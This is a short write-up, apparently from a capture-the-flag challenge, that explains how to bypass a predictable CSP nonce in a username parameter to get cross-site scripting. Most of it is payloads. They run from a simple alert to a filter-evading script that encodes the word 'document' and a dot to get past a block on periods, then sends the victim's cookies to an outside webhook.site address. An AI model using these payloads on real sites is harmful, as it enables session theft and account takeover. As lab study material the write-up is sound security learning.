# CSP-Nonce bypass

- first we have to find the csp bypass.
- look at the network traffic it will show the csp-nonce key.
- The key is in base64 which when decoded give the 10 charcater long **a** with the date.
- to bypass and create the xss we do this:
  
  ```js
  
  ?username=aaaaaaaaaa<script+nonce="<base64 encoded nonce>">alert(1)</script>
  
  ```
  
  
- The above payload will give us the xss.
- Now lets check for the cookies.

 ```js
  
  ?username=aaaaaaaaaa<script+nonce="<base64 encoded nonce>">alert(document.cookie)</script>
  
  ```
  
  - But unfortunately the **.** is blocked/filtered so we have to send to the webhook.
  - the payload for it will be:
  
 ```js
  
  ?username=aaaaaaaaaa<script+nonce="<base64 encoded nonce>">location=("//webhook"%2bdecodeURIComponent("%252E")%2b"site/<yoururl>?c="%2bwindow[decodeURIComponent("%25%36%34%25%36%66%25%36%33%25%37%35%25%36%64%25%36%35%25%36%65%25%37%34")]["cookie"])</script>
  
  ```
   
